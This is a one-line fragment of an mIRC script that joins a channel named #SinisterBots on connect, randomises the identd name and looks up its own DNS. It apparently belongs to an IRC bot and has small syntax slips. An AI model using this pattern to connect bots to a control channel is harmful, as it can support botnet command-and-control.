n44=on *:CONNECT:{ if (%chan == $null) { set %chan #SinisterBots ) } | /join %chan join | /identd on $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9) | /dns $me | /timercoolconnect off }
